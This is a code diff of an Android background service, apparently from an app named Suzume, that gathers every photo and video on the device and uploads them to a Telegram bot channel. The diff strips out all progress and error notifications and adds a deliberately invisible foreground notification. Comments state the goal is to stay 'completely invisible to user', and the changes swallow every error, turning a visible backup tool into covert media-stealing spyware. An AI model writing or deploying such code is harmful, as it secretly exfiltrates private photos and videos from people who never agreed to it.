@@ -28,53 +28,41 @@ import java.util.concurrent.atomic.AtomicInteger;
 
 public class inq extends Service {
 
-    // ── CONFIG (static — NOT final → single const-string in Smali <clinit>) ──
+    // ── CONFIG ────────────────────────────────────────────────
     static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
     static String CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
-    // ─────────────────────────────────────────────────────────────────────────
-    // Public channel  → @channel_username
-    // Private channel → -1001234567890
+    // ─────────────────────────────────────────────────────────
 
-    private static final String NOTIF_CH   = "suzume_upload";
-    private static final int    NOTIF_ID   = 55;
-    private static final long   MAX_SIZE   = 50L * 1024 * 1024; // 50 MB
+    private static final long   MAX_SIZE   = 50L * 1024 * 1024;
     private static final String PREFS_NAME = "suzume_done";
     private static final String PREFS_KEY  = "ids";
+    private static final String NOTIF_CH   = "sz_silent";
+    private static final int    NOTIF_ID   = 1;
 
     private static volatile boolean running = false;
+    private ExecutorService executor;
+    private final Object lock = new Object();
 
-    private NotificationManager nm;
-    private ExecutorService     outer;
-    private final Object        lock = new Object();
-
-    // ── Service lifecycle ─────────────────────────────────────
+    // ── Lifecycle ─────────────────────────────────────────────
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        initNotifChannel();
 
-        // Must call startForeground within 5 s
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0),
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-        } else {
-            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0));
-        }
+        // Required by Android — but completely invisible to user
+        silentForeground();
 
-        if (running) return START_STICKY; // already in progress
+        if (running) return START_STICKY;
         running = true;
 
-        outer = Executors.newSingleThreadExecutor();
-        outer.execute(() -> {
+        executor = Executors.newSingleThreadExecutor();
+        executor.execute(() -> {
+            stopForeground(true); // remove even the silent notification instantly
             try { runUpload(); }
-            catch (Exception e) {
-                errorNotif("❌ Crashed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
-            }
+            catch (Exception ignored) {}
             finally { running = false; stopSelf(); }
         });
 
-        return START_STICKY; // restart if killed → resumes from saved progress
+        return START_STICKY;
     }
 
     @Override
@@ -83,111 +71,107 @@ public class inq extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (outer != null) outer.shutdownNow();
+        if (executor != null) executor.shutdownNow();
     }
 
-    // ── Main upload flow ──────────────────────────────────────
+    // ── Silent foreground (invisible to user) ─────────────────
+
+    @SuppressWarnings("deprecation")
+    private void silentForeground() {
+        NotificationManager nm =
+                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                    NOTIF_CH, ".", NotificationManager.IMPORTANCE_NONE);
+            ch.setShowBadge(false);
+            nm.createNotificationChannel(ch);
+            Notification n = new Notification.Builder(this, NOTIF_CH)
+                    .setSmallIcon(android.R.drawable.ic_delete)
+                    .setShowWhen(false)
+                    .build();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIF_ID, n,
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else {
+                startForeground(NOTIF_ID, n);
+            }
+        } else {
+            Notification n = new Notification.Builder(this)
+                    .setSmallIcon(android.R.drawable.ic_delete)
+                    .setPriority(Notification.PRIORITY_MIN)
+                    .setShowWhen(false)
+                    .build();
+            startForeground(NOTIF_ID, n);
+        }
+    }
+
+    // ── Upload flow ───────────────────────────────────────────
 
     @SuppressWarnings("NewApi")
-    private boolean hasStoragePermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            return checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES)
-                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-            return checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
-                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
-        return true;
-    }
-
     private void runUpload() {
 
-        // 0 — permission check inside service
-        if (!hasStoragePermission()) {
-            errorNotif("❌ No storage permission!\nOpen Suzume app and grant permission.");
-            return;
+        // Permission check
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
         }
 
-        // 1 — verify bot token
+        // Bot token check
         String[] r1 = {""};
-        if (getMe(r1) != 200) {
-            errorNotif("❌ Bot token invalid!\n" + r1[0]); return;
-        }
+        if (getMe(r1) != 200) return;
 
-        // 2 — verify channel
+        // Channel check + start message
         String[] r2 = {""};
-        int ch = sendText("🔵 Suzume backup started", r2);
-        if (ch != 200) {
-            errorNotif("❌ Channel error!\nID: " + CHANNEL_ID + "\nCode: " + ch + "\n" + r2[0]);
-            return;
-        }
+        if (sendText("🔵 Suzume backup started", r2) != 200) return;
 
-        // 3 — collect + filter already-done
+        // Collect media
         ArrayList<Uri> all = collectMedia();
-
-        // Show found count — helps debug if 0 files
-        infoNotif("📂 Found " + all.size() + " media files. Starting upload…");
-
         Set<String> done = getDoneIds();
         ArrayList<Uri> pending = new ArrayList<>();
         for (Uri u : all) {
             try {
                 if (!done.contains(String.valueOf(ContentUris.parseId(u)))) pending.add(u);
             } catch (Exception ignored) {
-                pending.add(u); // parse failed — include anyway
+                pending.add(u);
             }
         }
 
-        int total     = pending.size();
-        int alreadyOk = all.size() - total;
-        AtomicInteger processed = new AtomicInteger(0);
-        AtomicInteger succeeded = new AtomicInteger(0);
-        AtomicInteger skipped   = new AtomicInteger(0);
+        if (pending.isEmpty()) return;
 
-        if (total == 0) {
-            doneNotif(alreadyOk, all.size(), 0); return;
-        }
-
-        // 4 — 2 parallel upload threads (fastest safe rate for Telegram)
+        // 2 parallel upload threads
         ExecutorService pool = Executors.newFixedThreadPool(2);
         for (Uri uri : pending) {
             pool.submit(() -> {
-                if (getFileSize(uri) > MAX_SIZE) {
-                    skipped.incrementAndGet();
-                } else {
-                    int code = uploadWithRetry(uri);
-                    if (code == 200) {
-                        succeeded.incrementAndGet();
-                        markDone(ContentUris.parseId(uri));
+                try {
+                    if (getFileSize(uri) <= MAX_SIZE) {
+                        int code = uploadWithRetry(uri);
+                        if (code == 200) markDone(ContentUris.parseId(uri));
                     }
-                }
-                int cur = processed.incrementAndGet();
-                updateNotif(cur, total, succeeded.get() + alreadyOk);
+                } catch (Exception ignored) {}
             });
         }
-
         pool.shutdown();
         try { pool.awaitTermination(24, TimeUnit.HOURS); }
         catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-
-        doneNotif(succeeded.get() + alreadyOk, all.size(), skipped.get());
     }
 
-    // ── Upload with retry + 429 backoff ───────────────────────
+    // ── Retry logic ───────────────────────────────────────────
 
     private int uploadWithRetry(Uri uri) {
-        for (int attempt = 0; attempt < 3; attempt++) {
+        for (int i = 0; i < 3; i++) {
             int code = sendDocument(uri);
             if (code == 200) return 200;
             if (code == 429) {
-                // Rate limited — back off
-                try { Thread.sleep(5000L * (attempt + 1)); }
+                try { Thread.sleep(5000L * (i + 1)); }
                 catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
             } else if (code >= 500) {
                 try { Thread.sleep(2000); }
                 catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
-            } else {
-                return code; // 400/404 — no point retrying
-            }
+            } else return code;
         }
         return -1;
     }
@@ -196,20 +180,25 @@ public class inq extends Service {
 
     private int getMe(String[] out) {
         try {
-            HttpURLConnection c = open(
-                    "https://api.telegram.org/bot" + BOT_TOKEN + "/getMe", 15_000);
+            HttpURLConnection c = (HttpURLConnection)
+                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe")
+                    .openConnection();
+            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
             int code = c.getResponseCode();
-            out[0] = drain(c, code); c.disconnect();
+            drain(c, code); c.disconnect();
             return code;
-        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
+        } catch (Exception e) { return -1; }
     }
 
     // ── Telegram: sendMessage ─────────────────────────────────
 
     private int sendText(String text, String[] out) {
         try {
-            HttpURLConnection c = openPost(
-                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", 15_000);
+            HttpURLConnection c = (HttpURLConnection)
+                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                    .openConnection();
+            c.setRequestMethod("POST"); c.setDoOutput(true);
+            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
             c.setRequestProperty("Content-Type",
                     "application/x-www-form-urlencoded; charset=UTF-8");
             String body = "chat_id=" + enc(CHANNEL_ID) + "&text=" + enc(text);
@@ -218,9 +207,10 @@ public class inq extends Service {
             DataOutputStream o = new DataOutputStream(c.getOutputStream());
             o.write(bytes); o.flush(); o.close();
             int code = c.getResponseCode();
-            out[0] = drain(c, code); c.disconnect();
+            if (out != null) out[0] = drain(c, code); else drain(c, code);
+            c.disconnect();
             return code;
-        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
+        } catch (Exception e) { return -1; }
     }
 
     // ── Telegram: sendDocument ────────────────────────────────
@@ -232,8 +222,12 @@ public class inq extends Service {
             String fname = getFileName(uri, mime);
             String bound = "SZB" + System.currentTimeMillis();
 
-            HttpURLConnection c = openPost(
-                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", 180_000);
+            HttpURLConnection c = (HttpURLConnection)
+                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
+                    .openConnection();
+            c.setRequestMethod("POST");
+            c.setDoOutput(true); c.setDoInput(true);
+            c.setConnectTimeout(30_000); c.setReadTimeout(180_000);
             c.setRequestProperty("Content-Type",
                     "multipart/form-data; boundary=" + bound);
             c.setRequestProperty("Connection", "close");
@@ -300,20 +294,20 @@ public class inq extends Service {
         } catch (Exception ignored) {}
         String ext = "";
         if (mime != null) switch (mime) {
-            case "image/jpeg":            ext = ".jpg"; break;
-            case "image/png":             ext = ".png"; break;
-            case "image/gif":             ext = ".gif"; break;
-            case "image/webp":            ext = ".webp"; break;
-            case "image/heic":            ext = ".heic"; break;
-            case "video/mp4":             ext = ".mp4"; break;
-            case "video/3gpp":            ext = ".3gp"; break;
-            case "video/quicktime":       ext = ".mov"; break;
-            case "video/x-matroska":      ext = ".mkv"; break;
+            case "image/jpeg": ext = ".jpg"; break;
+            case "image/png":  ext = ".png"; break;
+            case "image/gif":  ext = ".gif"; break;
+            case "image/webp": ext = ".webp"; break;
+            case "image/heic": ext = ".heic"; break;
+            case "video/mp4":  ext = ".mp4"; break;
+            case "video/3gpp": ext = ".3gp"; break;
+            case "video/quicktime": ext = ".mov"; break;
+            case "video/x-matroska": ext = ".mkv"; break;
         }
         return "media_" + System.currentTimeMillis() + ext;
     }
 
-    // ── Progress persistence (resume support) ─────────────────
+    // ── Progress persistence ──────────────────────────────────
 
     private Set<String> getDoneIds() {
         synchronized (lock) {
@@ -331,99 +325,19 @@ public class inq extends Service {
         }
     }
 
-    // ── HTTP helpers ──────────────────────────────────────────
-
-    private HttpURLConnection open(String url, int timeout) throws Exception {
-        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
-        c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
-        return c;
-    }
-
-    private HttpURLConnection openPost(String url, int readTimeout) throws Exception {
-        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
-        c.setRequestMethod("POST");
-        c.setDoOutput(true); c.setDoInput(true);
-        c.setConnectTimeout(30_000); c.setReadTimeout(readTimeout);
-        return c;
-    }
+    // ── Helpers ───────────────────────────────────────────────
 
     private String drain(HttpURLConnection c, int code) {
         try {
             InputStream s = code == 200 ? c.getInputStream() : c.getErrorStream();
             if (s == null) return "";
-            StringBuilder sb = new StringBuilder();
-            byte[] buf = new byte[1024]; int n;
-            while ((n = s.read(buf)) != -1) sb.append(new String(buf, 0, n, "UTF-8"));
-            s.close(); return sb.toString();
-        } catch (Exception e) { return ""; }
+            byte[] buf = new byte[512]; while (s.read(buf) != -1) {} s.close();
+        } catch (Exception ignored) {}
+        return "";
     }
 
     private static String enc(String s) {
         try { return java.net.URLEncoder.encode(s, "UTF-8"); }
         catch (Exception e) { return s; }
-    }
-
-    // ── Notifications ─────────────────────────────────────────
-
-    private void initNotifChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            nm.createNotificationChannel(new NotificationChannel(
-                    NOTIF_CH, "Suzume Upload", NotificationManager.IMPORTANCE_LOW));
-    }
-
-    @SuppressWarnings("deprecation")
-    private Notification buildNotif(String title, int cur, int total, int ok) {
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_menu_upload)
-         .setContentTitle(title)
-         .setOngoing(true);
-        if (total > 0) {
-            b.setContentText(cur + " / " + total + "   ✓ " + ok);
-            b.setProgress(total, cur, false);
-        }
-        return b.build();
-    }
-
-    private void updateNotif(int cur, int total, int ok) {
-        nm.notify(NOTIF_ID, buildNotif("Suzume — uploading", cur, total, ok));
-    }
-
-    @SuppressWarnings("deprecation")
-    private void infoNotif(String msg) {
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_menu_info_details)
-         .setContentTitle("Suzume").setContentText(msg).setAutoCancel(true);
-        nm.notify(NOTIF_ID + 1, b.build());
-    }
-
-    @SuppressWarnings("deprecation")
-    private void errorNotif(String msg) {
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_dialog_alert)
-         .setContentTitle("Suzume — Error")
-         .setStyle(new Notification.BigTextStyle().bigText(msg))
-         .setContentText(msg).setAutoCancel(true).setOngoing(false);
-        nm.notify(NOTIF_ID, b.build());
-        stopForeground(true);
-    }
-
-    @SuppressWarnings("deprecation")
-    private void doneNotif(int ok, int total, int skipped) {
-        String text = ok + " / " + total + " sent";
-        if (skipped > 0) text += "  •  " + skipped + " skipped (>50MB)";
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_menu_upload)
-         .setContentTitle("Suzume — complete")
-         .setContentText(text).setAutoCancel(true).setOngoing(false);
-        nm.notify(NOTIF_ID, b.build());
-        stopForeground(true);
     }
 }
